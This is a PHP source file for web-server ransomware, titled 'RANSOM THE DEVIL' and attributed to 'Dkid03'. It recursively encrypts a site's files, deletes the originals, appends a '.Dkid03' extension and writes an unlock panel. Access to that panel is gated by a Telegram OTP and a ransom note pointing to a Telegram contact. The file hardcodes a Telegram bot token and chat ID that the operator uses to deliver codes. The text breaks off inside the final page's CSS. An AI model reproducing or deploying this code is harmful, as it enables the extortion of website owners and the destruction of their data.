<?php
// ============================================
// RANSOM THE DEVIL 
// Author: Dkid03 
//please don't change the creator name 
// ============================================
session_start();

// Jika action lock, set time limit tak terbatas
if (isset($_POST['action']) && $_POST['action'] === 'lock') {
    set_time_limit(0);
    ignore_user_abort(true);
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
    ini_set('log_errors', 1);
    ini_set('error_log', __DIR__ . '/.lock_error.log');
}

// ------------------- KONFIGURASI KEAMANAN MAKSIMAL -------------------
$bot_token = '8040266222:AAH6t_vQFl_JTYR6rJzi7yakUMd3xWDqS7k';
$my_chat_id = '7547598395';
$verif_code = 'Dkid@123';

define('PBKDF2_ITERATIONS', 100000);
define('USE_COMPRESSION', true);
define('MAX_FILE_SIZE_MB', 20);
define('PASSWORD_LENGTH', 24);

$extensions = ['php', 'html', 'htm', 'phtml', 'js', 'css', 'xml', 'json', 'pdf', 'ppt', 'Php', 'jpeg', 'jpg', 'png', 'sql'];
$directories = [__DIR__];
$excluded_files = [
    __FILE__,
    __DIR__ . '/maintenance.html',
    __DIR__ . '/index.html',
    __DIR__ . '/unlock.php',
    __DIR__ . '/uploader.php',
    __DIR__ . '/.lock_password',
    __DIR__ . '/.lock_password_plain',
    __DIR__ . '/.lock_attempts',
    __DIR__ . '/.lock_progress',
    __DIR__ . '/.bf',
];

$password_file = __DIR__ . '/.lock_password';
$password_plain_file = __DIR__ . '/.lock_password_plain';
$maintenance_file = __DIR__ . '/maintenance.html';
$index_file = __DIR__ . '/index.html';
$unlock_file = __DIR__ . '/unlock.php';
$attempts_file = __DIR__ . '/.lock_attempts';
$progress_file = __DIR__ . '/.lock_progress';
$uploader_file = __DIR__ . '/uploader.php';
$bf_dir = __DIR__ . '/.bf';
if (!file_exists($bf_dir)) mkdir($bf_dir, 0700);

define('BF_MAX_ATTEMPTS', 3);
define('BF_BLOCK_TIME', 86400);

// ------------------- PILIH CIPHER TERBAIK -------------------
function get_best_cipher() {
    $available = openssl_get_cipher_methods();
    $preference = ['chacha20-poly1305','aes-256-gcm','aes-128-gcm','aes-256-ccm'];
    foreach ($preference as $cipher) {
        if (in_array($cipher, $available)) {
            $test = @openssl_encrypt('test', $cipher, random_bytes(32), OPENSSL_RAW_DATA, random_bytes(12), $tag);
            if ($test !== false) return $cipher;
        }
    }
    return false;
}
$cipher = get_best_cipher();
if (!$cipher) die("<div style='background:#0a0f1e;color:#ff0055;padding:20px;font-family:monospace;text-align:center;'>❌ ERROR: Tidak ada cipher AEAD yang didukung.</div>");
define('AEAD_CIPHER', $cipher);

// ------------------- FUNGSI UTILITY -------------------
function secure_file_put_contents($filename, $data) {
    $result = file_put_contents($filename, $data, LOCK_EX);
    if ($result !== false) chmod($filename, 0600);
    return $result;
}
function save_progress($processed, $total, $locked) {
    $progress = ['processed' => $processed, 'total' => $total, 'locked' => $locked, 'timestamp' => time()];
    secure_file_put_contents(__DIR__ . '/.lock_progress', json_encode($progress));
}
function load_progress() {
    $file = __DIR__ . '/.lock_progress';
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        if ($data && time() - $data['timestamp'] < 86400) return $data;
    }
    return null;
}
function clear_progress() {
    $file = __DIR__ . '/.lock_progress';
    if (file_exists($file)) unlink($file);
}

// ------------------- FUNGSI CEK BRUTE-FORCE -------------------
function check_bruteforce($ip) {
    global $bf_dir;
    $file = $bf_dir . '/' . md5($ip);
    if (file_exists($file)) {
        $data = explode(':', file_get_contents($file));
        if (count($data) == 2) {
            list($attempts, $first) = $data;
            if ($attempts >= BF_MAX_ATTEMPTS && time() - $first < BF_BLOCK_TIME) return false;
            if (time() - $first > BF_BLOCK_TIME) unlink($file);
        }
    }
    return true;
}
function record_failed_attempt($ip) {
    global $bf_dir;
    $file = $bf_dir . '/' . md5($ip);
    $data = '';
    if (file_exists($file)) {
        $parts = explode(':', file_get_contents($file));
        $attempts = (int)$parts[0] + 1;
        $first = $parts[1] ?? time();
        $data = $attempts . ':' . $first;
    } else {
        $data = '1:' . time();
    }
    secure_file_put_contents($file, $data);
}
function reset_bruteforce($ip) {
    global $bf_dir;
    $file = $bf_dir . '/' . md5($ip);
    if (file_exists($file)) unlink($file);
}

// ------------------- FUNGSI ENKRIPSI -------------------
function derive_key_from_password($password, $salt) {
    return hash_pbkdf2('sha256', $password, $salt, PBKDF2_ITERATIONS, 32, true);
}
function encrypt_file($source, $dest, $password) {
    $data = file_get_contents($source);
    if ($data === false) return false;
    $compressed = gzcompress($data, 9);
    if ($compressed === false) $compressed = $data;
    $salt = random_bytes(16);
    $key = derive_key_from_password($password, $salt);
    $iv = random_bytes(12);
    $tag = '';
    $ciphertext = openssl_encrypt($compressed, AEAD_CIPHER, $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($ciphertext === false) return false;
    $final = $salt . $iv . $tag . $ciphertext;
    return file_put_contents($dest, $final, LOCK_EX) !== false;
}
function decrypt_file($source, $dest, $password) {
    $handle = fopen($source, 'rb');
    if (!$handle) return false;
    $salt = fread($handle, 16);
    if (strlen($salt) !== 16) { fclose($handle); return false; }
    $iv = fread($handle, 12);
    if (strlen($iv) !== 12) { fclose($handle); return false; }
    $tag = fread($handle, 16);
    if (strlen($tag) !== 16) { fclose($handle); return false; }
    $ciphertext = stream_get_contents($handle);
    fclose($handle);
    $key = derive_key_from_password($password, $salt);
    $compressed = openssl_decrypt($ciphertext, AEAD_CIPHER, $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($compressed === false) return false;
    if (USE_COMPRESSION) {
        $data = gzuncompress($compressed);
        if ($data === false) $data = $compressed;
    } else {
        $data = $compressed;
    }
    return file_put_contents($dest, $data, LOCK_EX) !== false;
}

// ------------------- FUNGSI LOCK -------------------
function lock_files_with_password($extensions, $directories, $excluded_files, $password) {
    $locked = 0;
    $errors = [];
    $total_files = 0;
    foreach ($directories as $dir) {
        try {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $path = $file->getPathname();
                    if (!in_array($path, $excluded_files)) {
                        $ext = strtolower($file->getExtension());
                        if (in_array($ext, $extensions)) $total_files++;
                    }
                }
            }
        } catch (Exception $e) { error_log("LOCK: ".$e->getMessage()); }
    }
    $processed = 0;
    foreach ($directories as $dir) {
        try {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $path = $file->getPathname();
                    if (in_array($path, $excluded_files)) continue;
                    $ext = strtolower($file->getExtension());
                    if (in_array($ext, $extensions)) {
                        $newPath = $path . '.Dkid03';
                        if (!file_exists($newPath)) {
                            if (encrypt_file($path, $newPath, $password)) {
                                unlink($path);
                                $locked++;
                            } else {
                                $errors[] = $path;
                            }
                        }
                        $processed++;
                        if ($processed % 10 == 0) save_progress($processed, $total_files, $locked);
                    }
                }
            }
        } catch (Exception $e) { error_log("LOCK: ".$e->getMessage()); }
    }
    clear_progress();
    if (!empty($errors)) error_log("GAGAL MENGENKRIPSI " . count($errors) . " FILE");
    return $locked;
}

function unlock_files_with_password($extensions, $directories, $excluded_files, $password) {
    $unlocked = 0;
    foreach ($directories as $dir) {
        try {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $path = $file->getPathname();
                    if (substr($path, -7) === '.Dkid03') {
                        $original = substr($path, 0, -7);
                        if (!file_exists($original) && !in_array($original, $excluded_files)) {
                            if (decrypt_file($path, $original, $password)) {
                                unlink($path);
                                $unlocked++;
                            } else {
                                error_log("Gagal dekripsi: $path");
                            }
                        }
                    }
                }
            }
        } catch (Exception $e) { error_log("UNLOCK: ".$e->getMessage()); }
    }
    return $unlocked;
}

// ------------------- FUNGSI KIRIM TELEGRAM -------------------
function kirim_telegram($chat_id, $pesan) {
    global $bot_token;
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $pesan, 'parse_mode' => 'Markdown'];
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($result === false) return false;
        $response = json_decode($result, true);
        return isset($response['ok']) && $response['ok'] === true;
    } else {
        $options = ['http' => ['header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)]];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result === FALSE) return false;
        $response = json_decode($result, true);
        return isset($response['ok']) && $response['ok'] === true;
    }
}

// ------------------- GENERATE UNLOCK.PHP -------------------
function generate_unlock_file($unlock_file, $password_file, $extensions, $directories, $excluded_files, $index_file, $maintenance_file, $attempts_file, $bot_token, $domain, $my_chat_id, $verif_code, $cipher) {
    $content = '<?php
// ========== UNLOCK WEBSITE ==========
session_start();
$bot_token = ' . var_export($bot_token, true) . ';
$my_chat_id = ' . var_export($my_chat_id, true) . ';
$verif_code = ' . var_export($verif_code, true) . ';
$password_file = __DIR__ . \'/.lock_password\';
$attempts_file = __DIR__ . \'/.lock_attempts\';
$extensions = ' . var_export($extensions, true) . ';
$directories = ' . var_export($directories, true) . ';
$excluded_files = ' . var_export(array_merge($excluded_files, [__FILE__]), true) . ';
$index_file = __DIR__ . \'/index.html\';
$maintenance_file = __DIR__ . \'/maintenance.html\';
$domain = ' . var_export($domain, true) . ';
define(\'AEAD_CIPHER\', ' . var_export($cipher, true) . ');
define(\'USE_COMPRESSION\', true);
define(\'PBKDF2_ITERATIONS\', 100000);

$bf_dir = __DIR__ . \'/.bf\';
if (!file_exists($bf_dir)) mkdir($bf_dir, 0700);
define(\'BF_MAX_ATTEMPTS\', 3);
define(\'BF_BLOCK_TIME\', 86400);

function secure_file_put_contents($filename, $data) {
    $result = file_put_contents($filename, $data, LOCK_EX);
    if ($result !== false) chmod($filename, 0600);
    return $result;
}

function check_bruteforce($ip) {
    global $bf_dir;
    $file = $bf_dir . \'/\' . md5($ip);
    if (file_exists($file)) {
        $data = explode(\':\', file_get_contents($file));
        if (count($data) == 2) {
            list($attempts, $first) = $data;
            if ($attempts >= BF_MAX_ATTEMPTS && time() - $first < BF_BLOCK_TIME) return false;
            if (time() - $first > BF_BLOCK_TIME) unlink($file);
        }
    }
    return true;
}

function record_failed_attempt($ip) {
    global $bf_dir;
    $file = $bf_dir . \'/\' . md5($ip);
    $data = "";
    if (file_exists($file)) {
        $parts = explode(\':\', file_get_contents($file));
        $attempts = (int)$parts[0] + 1;
        $first = $parts[1] ?? time();
        $data = $attempts . \':\' . $first;
    } else {
        $data = \'1:\' . time();
    }
    secure_file_put_contents($file, $data);
}

function reset_bruteforce($ip) {
    global $bf_dir;
    $file = $bf_dir . \'/\' . md5($ip);
    if (file_exists($file)) unlink($file);
}

function cleanup_temp_files() {
    $now = time();
    foreach (glob(__DIR__ . \'/.lock_*\') as $f) if (is_file($f) && ($now - filemtime($f)) > 86400) unlink($f);
    foreach (glob(__DIR__ . \'/.bf/*\') as $f) if (is_file($f) && ($now - filemtime($f)) > 86400) unlink($f);
}
cleanup_temp_files();

function derive_key_from_password($password, $salt) {
    return hash_pbkdf2(\'sha256\', $password, $salt, PBKDF2_ITERATIONS, 32, true);
}

function decrypt_file($source, $dest, $password) {
    $handle = fopen($source, \'rb\');
    if (!$handle) return false;
    $salt = fread($handle, 16);
    if (strlen($salt) !== 16) { fclose($handle); return false; }
    $iv = fread($handle, 12);
    if (strlen($iv) !== 12) { fclose($handle); return false; }
    $tag = fread($handle, 16);
    if (strlen($tag) !== 16) { fclose($handle); return false; }
    $ciphertext = stream_get_contents($handle);
    fclose($handle);
    
    $key = derive_key_from_password($password, $salt);
    $compressed = openssl_decrypt($ciphertext, AEAD_CIPHER, $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($compressed === false) return false;
    
    if (USE_COMPRESSION) {
        $data = gzuncompress($compressed);
        if ($data === false) $data = $compressed;
    } else {
        $data = $compressed;
    }
    
    return file_put_contents($dest, $data, LOCK_EX) !== false;
}

function unlock_files($extensions, $directories, $excluded_files, $password) {
    $unlocked = 0;
    foreach ($directories as $dir) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $path = $file->getPathname();
                if (substr($path, -7) === \'.Dkid03\') {
                    $original = substr($path, 0, -7);
                    if (!file_exists($original) && !in_array($original, $excluded_files)) {
                        if (decrypt_file($path, $original, $password)) {
                            unlink($path);
                            $unlocked++;
                        }
                    }
                }
            }
        }
    }
    return $unlocked;
}

function kirim_telegram($chat_id, $pesan) {
    global $bot_token;
    if (function_exists(\'curl_init\')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$bot_token}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([\'chat_id\' => $chat_id, \'text\' => $pesan, \'parse_mode\' => \'Markdown\']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($result === false) return false;
        $response = json_decode($result, true);
        return isset($response[\'ok\']) && $response[\'ok\'] === true;
    } else {
        $options = [\'http\' => [\'header\' => "Content-type: application/x-www-form-urlencoded\r\n", \'method\' => \'POST\', \'content\' => http_build_query([\'chat_id\' => $chat_id, \'text\' => $pesan, \'parse_mode\' => \'Markdown\'])]];
        $context = stream_context_create($options);
        $result = @file_get_contents("https://api.telegram.org/bot{$bot_token}/sendMessage", false, $context);
        if ($result === FALSE) return false;
        $response = json_decode($result, true);
        return isset($response[\'ok\']) && $response[\'ok\'] === true;
    }
}

// OTP Login dengan timeout session 30 menit
$step = \'request\';
$error = \'\';
$client_ip = $_SERVER[\'REMOTE_ADDR\'] ?? \'0.0.0.0\';
$unlock_session_timeout = 1800; // 30 menit

if (!check_bruteforce($client_ip)) {
    die("<div style=\'background:#0a0f1e;color:#ff0055;padding:20px;font-family:monospace;text-align:center;\'>⛔ Terlalu banyak percobaan. Akses diblokir selama 1 jam.</div>");
}

// Cek session dengan timeout
if (isset($_SESSION[\'unlock_auth\']) && $_SESSION[\'unlock_auth\'] === true) {
    if (isset($_SESSION[\'unlock_auth_time\']) && time() - $_SESSION[\'unlock_auth_time\'] < $unlock_session_timeout) {
        $step = \'unlock\';
    } else {
        unset($_SESSION[\'unlock_auth\'], $_SESSION[\'unlock_auth_time\']);
        $step = \'request\';
    }
} else {
    $step = \'request\';
}

// Jika belum login, proses POST
if ($step !== \'unlock\') {
    if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {
        if (isset($_POST[\'action\'])) {
            if ($_POST[\'action\'] === \'request_otp\') {
                $input_verif = $_POST[\'verif\'] ?? \'\';
                if ($input_verif !== $verif_code) {
                    record_failed_attempt($client_ip);
                    $error = \'❌ Kode verifikasi salah.\';
                } else {
                    reset_bruteforce($client_ip);
                    $otp = random_int(100000, 999999);
                    $_SESSION[\'unlock_pending_otp\'] = $otp;
                    $_SESSION[\'unlock_pending_expire\'] = time() + 300;
                    $pesan = "🔑 *Kode Akses Unlock Panel*\\n\\nKode Anda: `$otp`\\n\\nBerlaku 5 menit.";
                    if (kirim_telegram($my_chat_id, $pesan)) {
                        $step = \'verify\';
                    } else {
                        $error = \'❌ Gagal mengirim OTP.\';
                    }
                }
            } elseif ($_POST[\'action\'] === \'verify_otp\' && isset($_POST[\'otp\'])) {
                if (isset($_SESSION[\'unlock_pending_otp\'], $_SESSION[\'unlock_pending_expire\']) && time() < $_SESSION[\'unlock_pending_expire\']) {
                    if ($_POST[\'otp\'] == $_SESSION[\'unlock_pending_otp\']) {
                        reset_bruteforce($client_ip);
                        $_SESSION[\'unlock_auth\'] = true;
                        $_SESSION[\'unlock_auth_time\'] = time();
                        unset($_SESSION[\'unlock_pending_otp\'], $_SESSION[\'unlock_pending_expire\']);
                        $step = \'unlock\';
                    } else {
                        record_failed_attempt($client_ip);
                        $error = \'❌ Kode salah.\';
                    }
                } else {
                    $error = \'❌ Kode kadaluarsa.\';
                    unset($_SESSION[\'unlock_pending_otp\'], $_SESSION[\'unlock_pending_expire\']);
                }
            }
        }
    }
}

if ($step === \'request\') {
    ?><!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Unlock - Verifikasi</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;font-family:\'Courier New\',monospace;color:#00ff9d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 50%, #1a1f2e, #0a0f1e);}
        .container{max-width:450px;width:100%;background:#111827ee;backdrop-filter:blur(10px);border:2px solid #00ff9d;box-shadow:0 0 30px #00ff9d66, inset 0 0 20px #00ff9d33;border-radius:15px;padding:30px;animation:fadeIn 0.5s;}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
        h2{text-align:center;font-size:1.8rem;text-transform:uppercase;letter-spacing:3px;text-shadow:0 0 10px #00ff9d;margin-bottom:20px;border-bottom:1px dashed #00ff9d;padding-bottom:10px;}
        .security-badge{display:flex;justify-content:center;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
        .badge-item{background:#1e293b;padding:6px 12px;border-radius:20px;border:1px solid #00ff9d;font-size:0.75rem;font-weight:bold;}
        .badge-item.high{background:#ff005522;border-color:#ff0055;color:#ff0055;}
        .warning{background:#1e293b;border-left:5px solid #ffaa00;padding:15px;margin-bottom:25px;color:#00ff9d;font-size:0.9rem;box-shadow:0 0 10px #00ff9d33;}
        .form-group{margin-bottom:20px;}
        label{display:block;margin-bottom:8px;color:#00ff9d;text-transform:uppercase;font-size:0.9rem;letter-spacing:1px;}
        input{width:100%;padding:12px;background:#0a0f1e;border:2px solid #00ff9d;color:#00ff9d;font-family:inherit;border-radius:8px;font-size:1rem;outline:none;transition:0.3s;}
        input:focus{box-shadow:0 0 15px #00ff9d;}
        button{background:transparent;border:2px solid #00ff9d;color:#00ff9d;padding:14px;font-weight:bold;text-transform:uppercase;letter-spacing:2px;cursor:pointer;width:100%;border-radius:8px;transition:0.3s;font-size:1rem;}
        button:hover{background:#00ff9d;color:#0a0f1e;box-shadow:0 0 25px #00ff9d;}
        .error{background:#ff005522;border:1px solid #ff0055;color:#ff0055;padding:12px;border-radius:8px;margin-bottom:20px;text-align:center;font-weight:bold;}
        .footer-note{color:#6c757d;font-size:0.8rem;margin-top:20px;text-align:center;}
        #loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0f1eee;display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;}
        .loader{border:4px solid #1e293b;border-top:4px solid #00ff9d;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px;box-shadow:0 0 20px #00ff9d;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .glitch-text{font-size:1.2rem;text-transform:uppercase;letter-spacing:5px;animation:glitch 1s infinite;}
        @keyframes glitch{0%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}25%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}50%{text-shadow:0.025em 0.05em 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}75%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}100%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}}
    </style>
</head>
<body>
<div id="loading-overlay"><div class="loader"></div><div class="glitch-text">MEMPROSES...</div></div>
<div class="container">
    <h2>🔓 UNLOCK PANEL</h2>
    <div class="security-badge">
        <span class="badge-item">🔐 <?php echo AEAD_CIPHER; ?></span>
        <span class="badge-item">⚡ PBKDF2 <?php echo PBKDF2_ITERATIONS; ?></span>
        <span class="badge-item">📦 KOMPRESI <?php echo USE_COMPRESSION ? \'AKTIF\' : \'NONAKTIF\'; ?></span>
        <span class="badge-item high">Dkid03</span>
    </div>
    <div class="warning">
        <strong>🔑 TWO-FACTOR AUTHENTICATION</strong><br>
        contact t.me/felisaaprin to get the password
    </div>
    <?php if ($error) echo "<div class=\'error\'>$error</div>"; ?>
    <form method="post" id="otpForm">
        <input type="hidden" name="action" value="request_otp">
        <div class="form-group">
            <label>Kode Verifikasi</label>
            <input type="text" name="verif" placeholder="Masukkan kode verifikasi" required autofocus>
        </div>
        <button type="submit">MINTA KODE AKSES</button>
    </form>
    <div class="footer-note">THE DEVIL RANSOMWARE</div>
</div>
<script>
document.getElementById(\'otpForm\')?.addEventListener(\'submit\', function() {
    document.getElementById(\'loading-overlay\').style.display = \'flex\';
    this.querySelector(\'button\').disabled = true;
});
</script>
</body>
</html><?php
    exit;
}
if ($step === \'verify\') {
    ?><!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Unlock - Verifikasi OTP</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;font-family:\'Courier New\',monospace;color:#00ff9d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 50%, #1a1f2e, #0a0f1e);}
        .container{max-width:450px;width:100%;background:#111827ee;backdrop-filter:blur(10px);border:2px solid #00ff9d;box-shadow:0 0 30px #00ff9d66, inset 0 0 20px #00ff9d33;border-radius:15px;padding:30px;animation:fadeIn 0.5s;}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
        h2{text-align:center;font-size:1.8rem;text-transform:uppercase;letter-spacing:3px;text-shadow:0 0 10px #00ff9d;margin-bottom:20px;border-bottom:1px dashed #00ff9d;padding-bottom:10px;}
        .security-badge{display:flex;justify-content:center;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
        .badge-item{background:#1e293b;padding:6px 12px;border-radius:20px;border:1px solid #00ff9d;font-size:0.75rem;font-weight:bold;}
        .badge-item.high{background:#ff005522;border-color:#ff0055;color:#ff0055;}
        .warning{background:#1e293b;border-left:5px solid #00ff9d;padding:15px;margin-bottom:25px;color:#00ff9d;font-size:0.9rem;box-shadow:0 0 10px #00ff9d33;}
        .form-group{margin-bottom:20px;}
        label{display:block;margin-bottom:8px;color:#00ff9d;text-transform:uppercase;font-size:0.9rem;letter-spacing:1px;}
        input{width:100%;padding:12px;background:#0a0f1e;border:2px solid #00ff9d;color:#00ff9d;font-family:inherit;border-radius:8px;font-size:1rem;outline:none;transition:0.3s;}
        input:focus{box-shadow:0 0 15px #00ff9d;}
        button{background:transparent;border:2px solid #00ff9d;color:#00ff9d;padding:14px;font-weight:bold;text-transform:uppercase;letter-spacing:2px;cursor:pointer;width:100%;border-radius:8px;transition:0.3s;font-size:1rem;}
        button:hover{background:#00ff9d;color:#0a0f1e;box-shadow:0 0 25px #00ff9d;}
        .error{background:#ff005522;border:1px solid #ff0055;color:#ff0055;padding:12px;border-radius:8px;margin-bottom:20px;text-align:center;font-weight:bold;}
        .footer-note{color:#6c757d;font-size:0.8rem;margin-top:20px;text-align:center;}
        #loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0f1eee;display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;}
        .loader{border:4px solid #1e293b;border-top:4px solid #00ff9d;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px;box-shadow:0 0 20px #00ff9d;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .glitch-text{font-size:1.2rem;text-transform:uppercase;letter-spacing:5px;animation:glitch 1s infinite;}
        @keyframes glitch{0%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}25%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}50%{text-shadow:0.025em 0.05em 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}75%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}100%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}}
    </style>
</head>
<body>
<div id="loading-overlay"><div class="loader"></div><div class="glitch-text">MEMVERIFIKASI...</div></div>
<div class="container">
    <h2>🔓 MASUKKAN KODE</h2>
    <div class="security-badge">
        <span class="badge-item">🔐 <?php echo AEAD_CIPHER; ?></span>
        <span class="badge-item">⚡ PBKDF2 <?php echo PBKDF2_ITERATIONS; ?></span>
        <span class="badge-item">📦 KOMPRESI <?php echo USE_COMPRESSION ? \'AKTIF\' : \'NONAKTIF\'; ?></span>
        <span class="badge-item high">Dkid03</span>
    </div>
    <div class="warning">
        <strong>📨 Kode OTP telah dikirim ke Telegram</strong><br>
        Masukkan kode 6 digit yang diterima.
    </div>
    <?php if ($error) echo "<div class=\'error\'>$error</div>"; ?>
    <form method="post" id="verifyForm">
        <input type="hidden" name="action" value="verify_otp">
        <div class="form-group">
            <label>Kode OTP</label>
            <input type="number" name="otp" placeholder="123456" required autofocus>
        </div>
        <button type="submit">VERIFIKASI</button>
    </form>
    <div class="footer-note"><a href="?" style="color:#00ff9d;">← Minta ulang kode</a></div>
</div>
<script>
document.getElementById(\'verifyForm\')?.addEventListener(\'submit\', function() {
    document.getElementById(\'loading-overlay\').style.display = \'flex\';
    this.querySelector(\'button\').disabled = true;
});
</script>
</body>
</html><?php
    exit;
}

// Halaman unlock (setelah OTP)
if (file_exists($attempts_file)) $attempts = (int) file_get_contents($attempts_file);
else $attempts = 0;
$message = "";
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["action"])) {
    if ($_POST["action"] === "unlock" && isset($_POST["password"]) && $attempts < 3) {
        $input = $_POST["password"];
        if (file_exists($password_file)) {
            $hash = file_get_contents($password_file);
            if (password_verify($input, $hash)) {
                if (file_exists($attempts_file)) unlink($attempts_file);
                $count = unlock_files($extensions, $directories, $excluded_files, $input);
                unlink($password_file);
                if (file_exists($index_file)) unlink($index_file);
                if (file_exists($maintenance_file)) unlink($maintenance_file);
                if (file_exists(__FILE__)) unlink(__FILE__);
                $message = "<div class=\'success\'>✅ Website dibuka. $count file dikembalikan. File unlock & maintenance dihapus.</div>";
            } else {
                $attempts++;
                secure_file_put_contents($attempts_file, $attempts);
                if ($attempts >= 3) {
                    unset($_SESSION[\'unlock_auth\']);
                    $message = "<div class=\'error\'>❌ Terlalu banyak percobaan. Silakan <a href=\'?\' style=\'color:#00ff9d;\'>minta kode akses baru</a>.</div>";
                } else {
                    $message = "<div class=\'error\'>❌ Password salah. Percobaan tersisa: " . (3 - $attempts) . "</div>";
                }
            }
        } else $message = "<div class=\'error\'>❌ Website tidak dalam keadaan terkunci.</div>";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Unlock Website</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;font-family:"Courier New",monospace;color:#00ff9d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 50%, #1a1f2e, #0a0f1e);}
        .container{max-width:450px;width:100%;background:#111827ee;backdrop-filter:blur(10px);border:2px solid #00ff9d;box-shadow:0 0 30px #00ff9d66, inset 0 0 20px #00ff9d33;border-radius:15px;padding:30px;animation:fadeIn 0.5s;}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
        h2{text-align:center;font-size:1.8rem;text-transform:uppercase;letter-spacing:3px;text-shadow:0 0 10px #00ff9d;margin-bottom:20px;border-bottom:1px dashed #00ff9d;padding-bottom:10px;}
        .security-badge{display:flex;justify-content:center;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
        .badge-item{background:#1e293b;padding:6px 12px;border-radius:20px;border:1px solid #00ff9d;font-size:0.75rem;font-weight:bold;}
        .badge-item.high{background:#ff005522;border-color:#ff0055;color:#ff0055;}
        .success{background:#00ff9d22;border:1px solid #00ff9d;color:#00ff9d;padding:15px;border-radius:8px;margin-bottom:20px;text-align:center;font-weight:bold;}
        .error{background:#ff005522;border:1px solid #ff0055;color:#ff0055;padding:15px;border-radius:8px;margin-bottom:20px;text-align:center;font-weight:bold;}
        .form-group{margin-bottom:20px;}
        label{display:block;margin-bottom:8px;color:#00ff9d;text-transform:uppercase;font-size:0.9rem;letter-spacing:1px;}
        input{width:100%;padding:12px;background:#0a0f1e;border:2px solid #00ff9d;color:#00ff9d;font-family:inherit;border-radius:8px;font-size:1rem;outline:none;transition:0.3s;}
        input:focus{box-shadow:0 0 15px #00ff9d;}
